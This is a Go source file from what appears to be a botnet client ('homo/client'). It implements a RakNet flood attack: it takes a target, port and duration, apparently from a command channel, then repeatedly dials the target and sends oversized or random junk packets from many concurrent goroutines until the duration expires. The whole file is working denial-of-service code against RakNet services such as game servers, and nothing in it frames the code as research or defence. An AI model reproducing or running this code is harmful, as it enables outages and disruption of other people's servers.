package methods

import (
	"fmt"
	"homo/client/balancer"
	"homo/client/utils"
	"strconv"
	"strings"
	"time"

	"github.com/sandertv/go-raknet"
)

func Raknet(target string, port string, duration string) {

	duration = strings.ReplaceAll(duration, "\x00", "")
	duration = strings.ReplaceAll(duration, "\x03", "")
	duration = strings.ReplaceAll(duration, "\r", "")

	dur, err := strconv.Atoi(string(duration))

	if err != nil {
		fmt.Println(err)
	}
	sec := time.Now().Unix()
	for time.Now().Unix() <= sec+int64(dur)-1 {
		go raknetConn(target, port)
		time.Sleep(100 * time.Millisecond)
		go raknetConn(target, port)
	}

}

func raknetConn(target string, port string) {

	defer func() { // try catch
		if er := recover(); er != nil {
			fmt.Print(er)
			return
		}
	}()

	conn, err := raknet.Dial(target + ":" + port)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer conn.Close()

	fmt.Println(target)

	for i := 0; i < 20; i++ {
		select {
		case <-balancer.BalanceCh:
			fmt.Println("balancer")
			time.Sleep(5 * time.Second)
		default:
			fmt.Println(i)
			go sendPacket(conn, "nilpayload", 50000)
			go sendPacket(conn, "maxpayload", 20000)
			go sendPacket(conn, "random", 3000*i)
			go sendPacket(conn, "nilpayload", 50000)
			go sendPacket(conn, "maxpayload", 20000)
			go sendPacket(conn, "random", 3000*i)
			time.Sleep(500 * time.Millisecond)
		}
	}

}

func sendPacket(conn *raknet.Conn, mode string, size int) {

	var packet []byte
	switch mode {
	case "nilpayload":
		payload := make([]byte, size)

		payload = append(payload, byte(utils.RandomInt(2)), byte(utils.RandomInt(1)), byte(utils.RandomInt(2)), byte(utils.RandomInt(2)))
		packet = payload
	case "maxpayload":
		payload := make([]byte, 0)

		for i := 0; i <= size; i++ {
			payload = append(payload, byte(utils.RandomInt(2)))
		}

		packet = payload

	case "random":
		var bytestr string

		for i := 0; i <= size; i++ {
			bytestr += strconv.Itoa(utils.RandomInt(2))
		}

		var res string
		for _, i := range bytestr {
			res += string(i >> 4 * 4)
		}
		packet = []byte(res)

	}

	_, err := conn.Write(packet)

	if err != nil {
		fmt.Println(err)

	}

	go func() {
	READ:
		var count int
		b := make([]byte, 6000)

		_, err := conn.Read(b)

		if err != nil {

			if count >= 5 {
				return
			}

			count++
			goto READ
		}
	}()

}
